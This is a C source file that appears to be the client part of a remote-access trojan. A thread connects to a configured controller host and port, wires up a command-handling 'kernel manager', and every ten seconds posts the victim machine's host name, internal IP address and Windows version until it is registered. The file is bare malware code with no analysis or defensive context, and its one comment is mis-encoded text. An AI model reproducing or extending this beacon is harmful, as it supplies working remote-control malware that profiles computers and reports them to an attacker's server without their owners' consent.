#include "Client.h"
#include "KernelManager.h"

#include <stdio.h>
//#include "map.h"

#pragma comment (lib,"ws2_32.lib")

void PostLoginInfo(CClient* pclient)
{

	char name[1024];
	char strIp[32];
	char strSystem[32];
	
	PHOSTENT pHost;
	gethostname(name,sizeof(name));
	pHost = gethostbyname(name);
	sprintf(strIp,"%s",inet_ntoa(*(struct in_addr *)*pHost->h_addr_list));  //»ñÈ¡ÄÚÍøIP
	
	OSVERSIONINFO os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if(GetVersionEx(&os) ==0)
	{	
		return ;
	}
	if(os.dwMajorVersion == 6 )
	{
		sprintf(strSystem,"%s","Windows7");

	}

	if(os.dwMajorVersion == 5 && os.dwMinorVersion ==2)
	{
		sprintf(strSystem,"%s","Windows 2003");

	}

	if(os.dwMajorVersion == 5 && os.dwMinorVersion == 1)
	{
		sprintf(strSystem,"%s","Windows XP");

	}

	if(os.dwMajorVersion == 5 && os.dwMinorVersion ==0)
	{
		sprintf(strSystem,"%s","Windows 2000");

	}

	if(os.dwMajorVersion <= 4 )
	{
		sprintf(strSystem,"%s","Windows NT");

	}
	char* strVer="1";
    char* strId="";
	
	char PostData[1024];
    sprintf(PostData,"cmd=%03d&ver=%s&id=%s&name=%s&ip=%s&system=%s",COMMAND_SIGN,strVer,strId,name,strIp,strSystem);

	pclient->post(PostData, strlen(PostData)+1);
}

static DWORD WINAPI login()
{
	CClient  pClient;
	CKernelManager manager(&pClient);
	pClient.setManagerCallBack(&manager);
	if (pClient.Connect(THEHOST, THEPORT)<0) {
		printf("connect error!\n");
		exit(-1);
	}
	while(1)
	{

		if (!manager.b_signed)
		{
			PostLoginInfo(&pClient);
		}
		
		/*
		else
				{   char* strVer="1";
					char PostData[10];
					sprintf(PostData,"ver=%s&id=%03d",strVer,manager.m_id);
					
					pClient.post(PostData, strlen(PostData)+1);
				}
		*/
		
		Sleep(1000*10);
	}

}
void main()
{
	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)login,NULL,0,NULL);
	while (1) {
		Sleep(1000*100);
	}
}

